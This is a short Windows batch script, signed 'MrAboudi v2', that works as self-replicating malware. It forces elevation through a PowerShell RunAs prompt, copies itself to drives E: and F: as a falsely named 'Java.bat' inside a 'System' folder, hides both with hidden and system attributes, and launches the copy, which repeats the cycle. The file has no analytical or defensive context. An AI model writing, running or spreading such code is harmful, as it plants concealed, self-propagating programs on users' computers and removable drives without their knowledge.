@echo off
setlocal enabledelayedexpansion

:: Admin check and prompt if needed
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

set "SELF=%~f0"

for %%D in (E F) do (
    if exist "%%D:\" (
        set "FOLDER=System %%D"
        set "FOLDERPATH=%%D:\!FOLDER!"
        set "TARGETBAT=!FOLDERPATH!\Java.bat"

        echo Creating folder "!FOLDERPATH!" on drive %%D
        mkdir "!FOLDERPATH!" 2>nul
        if exist "!FOLDERPATH!" (
            echo Copying script to "!TARGETBAT!"
            copy "%SELF%" "!TARGETBAT!" >nul
            if exist "!TARGETBAT!" (
                echo Hiding folder and batch file...
                attrib +h +s "!FOLDERPATH!"
                attrib +h +s "!TARGETBAT!"
                echo Starting "!TARGETBAT!"
                start "" "!TARGETBAT!"
            ) else (
                echo FAILED to copy Java.bat on drive %%D
            )
        ) else (
            echo FAILED to create folder on drive %%D
        )
    ) else (
        echo Drive %%D does not exist.
    )
)

pause
exit

:: By MrAboudi
:: v2
